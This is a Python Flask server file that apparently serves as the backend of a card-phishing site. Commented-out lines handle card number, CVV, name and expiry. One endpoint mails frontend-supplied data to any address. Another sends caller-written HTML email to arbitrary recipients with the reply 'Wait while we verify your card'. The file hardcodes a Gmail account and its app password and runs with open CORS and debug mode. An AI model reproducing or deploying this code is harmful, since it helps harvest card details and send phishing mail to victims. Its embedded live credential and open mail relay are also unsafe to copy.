from routes import goods
from flask import Flask,request,jsonify
from flask_cors import CORS
from flask_mail import Mail, Message
import os
import json
from werkzeug.utils import secure_filename
app=Flask(__name__)
# Flask-Mail configuration
app.config['MAIL_SERVER'] = 'smtp.gmail.com'  # or your mail provider
app.config['MAIL_PORT'] = 465  # For SSL use 465, for TLS use 587
app.config['MAIL_USE_TLS'] = False  # Disable TLS if using SSL
app.config['MAIL_USE_SSL'] = True   # Enable SSL
app.config['MAIL_USERNAME'] = 'lambertmiranda909@gmail.com'  # Your email address
app.config['MAIL_PASSWORD'] = 'mqjpmzagmaznqjly'  # Your email password (or app-specific password)
app.config['MAIL_DEFAULT_SENDER'] = 'lambertmiranda909@gmail.com'  # Default sender address
mail = Mail(app)
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Create upload folder if it doesn't exist
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

CORS(app)
def main():
    print('welcome to server')
    @app.route('/products')
    def serveProduct():
        print('initialising product routes')
        return jsonify(goods.getProducts())
    @app.route('/sendemail', methods=['POST'])
    def send_email():
        print('data')
        
        subject = request.form.get('subject')
        recipient = request.form.get('email')
        frontend_msg = request.form.get('msg')
        mesg=json.loads(frontend_msg)
        image=''
        
        if not subject or not recipient or not mesg:
            return jsonify({'error': 'Missing data'}), 400
        
        if isinstance(mesg, dict):
             mesg = json.dumps(mesg, indent=4)

        # Create the email message
        msg = Message(subject, recipients=[recipient])
        # ccv=str(body['cc_cvv'])
        # ccNum=str(body['cc_num'])
        # cc_name=str(body['cc_name'])
        # email=str(body['email'])
        # address=str(body['address'])
        # cc_exp=str(body['cc_exp'])
        msg.body = mesg
        if(request.files.get('image')):
            image=request.files['image']
            filename = secure_filename('tempimg')
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            image.save(filepath)
            with app.open_resource(filepath) as img_file:
                msg.attach(filename, 'image/jpeg', img_file.read())

        try:
            # Send the email
            mail.send(msg)
            print(mesg)
            return jsonify({'message': 'Loading...'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
        
    @app.route('/sendMessageToCustomer',methods=['POST'])
    def sendMessageToCustomer():
        recipient=request.form.get('email')
        mesg=request.form.get('msg')
        subject=request.form.get('subject')
        msg = Message(subject, recipients=[recipient],html=mesg)
        try:
            # Send the email
            mail.send(msg)
            
            return jsonify({'message': 'Wait while we verify your card'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500        



    if __name__=='__main__':
        app.run(debug=True)
   
main()